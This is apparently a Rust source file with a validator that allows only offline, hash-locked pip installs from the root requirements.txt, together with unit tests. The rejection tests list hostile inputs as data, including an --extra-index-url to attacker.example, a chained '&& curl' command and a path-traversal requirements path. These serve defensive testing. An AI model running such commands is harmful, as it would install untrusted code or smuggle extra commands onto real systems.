pub(crate) fn safe_pip_restore_command(command: &str) -> bool {
    if command
        .chars()
        .any(|character| ";&|$`<>\\\n\r".contains(character))
    {
        return false;
    }
    let mut tokens = command.split_ascii_whitespace();
    let Some(first) = tokens.next() else {
        return false;
    };
    match first {
        "python3" => {
            if tokens.next() != Some("-m") || tokens.next() != Some("pip") {
                return false;
            }
        }
        "pip" | "pip3" => {}
        _ => return false,
    }
    if tokens.next() != Some("install") {
        return false;
    }
    let mut requirement_seen = false;
    let mut require_hashes = false;
    let mut no_deps = false;
    let mut no_index = false;
    let mut needs_requirement_path = false;
    for token in tokens {
        if needs_requirement_path {
            if requirement_seen || token != "requirements.txt" {
                return false;
            }
            requirement_seen = true;
            needs_requirement_path = false;
            continue;
        }
        match token {
            "--require-hashes" => require_hashes = true,
            "--no-deps" => no_deps = true,
            "--no-index" => no_index = true,
            "--disable-pip-version-check" | "--no-input" | "--only-binary=:all:" => {}
            "-r" | "--requirement" => needs_requirement_path = true,
            "--requirement=requirements.txt" => {
                if requirement_seen {
                    return false;
                }
                requirement_seen = true;
            }
            _ if token.starts_with("-r") && token.len() > 2 => {
                if requirement_seen || &token[2..] != "requirements.txt" {
                    return false;
                }
                requirement_seen = true;
            }
            _ => return false,
        }
    }
    requirement_seen && !needs_requirement_path && require_hashes && no_deps && no_index
}

#[cfg(test)]
mod tests {
    use super::safe_pip_restore_command;

    #[test]
    fn permits_only_offline_hash_locked_root_requirements_restores() {
        for command in [
            "python3 -m pip install --no-index --require-hashes --no-deps -r requirements.txt",
            "pip3 install --require-hashes --no-deps --no-index --requirement=requirements.txt",
            "pip install --no-index --require-hashes --no-deps --only-binary=:all: -rrequirements.txt",
        ] {
            assert!(safe_pip_restore_command(command), "rejected {command:?}");
        }
    }

    #[test]
    fn rejects_online_expanded_unlocked_or_nonroot_pip_restores() {
        for command in [
            "python3 -m pip install -r requirements.txt",
            "python3 -m pip install --no-index --no-deps -r requirements.txt",
            "python3 -m pip install --no-index --require-hashes -r requirements.txt",
            "python3 -m pip install --no-index --require-hashes --no-deps -r ../requirements.txt",
            "python3 -m pip install --no-index --require-hashes --no-deps --extra-index-url https://attacker.example/simple -r requirements.txt",
            "python3 -m pip install --no-index --require-hashes --no-deps --find-links=/tmp/wheels -r requirements.txt",
            "python3 -m pip install --no-index --require-hashes --no-deps -r requirements.txt && curl https://example.test",
            "python3 -m pip install --no-index --require-hashes --no-deps -e .",
        ] {
            assert!(!safe_pip_restore_command(command), "accepted {command:?}");
        }
    }
}
